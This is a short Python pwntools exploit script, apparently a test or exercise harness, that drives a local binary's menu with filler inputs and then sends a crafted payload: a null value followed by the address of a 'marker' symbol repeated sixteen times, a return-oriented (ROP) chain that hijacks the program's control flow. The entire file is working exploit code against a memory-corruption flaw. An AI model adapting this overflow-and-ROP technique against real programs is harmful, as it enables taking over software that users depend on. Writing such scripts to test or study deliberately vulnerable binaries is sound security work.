#!/usr/bin/env python3
from pwn import *

if len(sys.argv) != 2:
    print("Invalid program name.")
    exit(1)
else:
    binary = sys.argv[1]

context.log_level = "error"

exe = context.binary = ELF(binary)

io = process(exe.path)

io.sendlineafter(b"> ", b"1")
for i in range(19):
    io.sendlineafter(b": ", b"a")
    io.sendlineafter(b": ", b"a")
    io.sendlineafter(b": ", b"a")
    io.sendlineafter(b": ", b"y")

io.sendlineafter(b": ", b"a")
io.sendlineafter(b": ", b"a")
io.sendlineafter(b": ", b"a")

payload = p64(0x0) + p64(exe.sym["marker"])*16

io.sendafter(b": ", b"\x00")
io.sendafter(b": ", b"\x00")
io.sendafter(b": ", payload)
io.sendafter(b": ", b"n")

io.wait_for_close()

exit(io.poll())

#ROP chain attack